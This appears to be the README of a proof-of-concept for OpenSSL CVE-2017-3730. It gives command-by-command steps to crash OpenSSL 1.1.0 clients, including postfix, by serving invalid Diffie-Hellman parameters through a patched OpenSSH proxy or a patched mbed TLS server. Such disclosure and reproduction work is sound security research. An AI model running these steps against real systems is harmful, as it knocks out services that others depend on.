# CVE-2017-3730
OpenSSL CVE-2017-3730 proof-of-concept

## Using OpenSSH as a proxy to patch DH values on the fly

- Create an SSL server using a ciphersuite like ```DHE-PSK-WITH-AES-256-GCM-SHA384```. Let's say it runs on 10.0.2.2 port 8899
- Get openssh-7.4p1
- Apply patch
- Build it
- Run it like:
```
./ssh -vvv -N -D 1085 -o TCPKeepAlive=yes -o ServerAliveInterval=60 localhost
```
- In a different terminal create a file ```~/.tsocks.conf``` with this content:
```
server = 127.0.0.1
server_port = 1085
server_type = 5
local = 127.0.0.0/255.255.255.0
```
- ```export TSOCKS_CONF_FILE=`realpath ~/.tsocks.conf````
- ```tsocks```
- This creates a shell in which all network traffic flows through our "evil" proxy
- ```openssl s_client -connect 10.0.2.2:8899 -psk AA```
- crash

## Modify mbed TLS to serve invalid DH parameter

- Get https://github.com/ARMmbed/mbedtls/archive/mbedtls-2.4.1.tar.gz
- Apply ```mbedtls-2.4.1-patch.txt```
- make -j4 programs
- Run server: ```programs/ssl/ssl_server2 force_ciphersuite=TLS-DHE-RSA-WITH-AES-256-GCM-SHA384```
- Connect to it with OpenSSL 1.1.0 client
- crash

## Crashing postfix remotely

- Compile postfix with OpenSSL 1.1.0
- Compile ```crash-postfix.c``` against the PATCHED mbed TLS (see above)
- What I did was run postfix in a VM and run ```crash-postfix``` on the host:
- ```iptables -t nat -A OUTPUT -p tcp --dport 25 -j DNAT --to-destination 10.0.2.2:8888```
- Start ```crash-postfix```
- Run postfix: ```posttls-finger 10.0.2.2```
- Crash
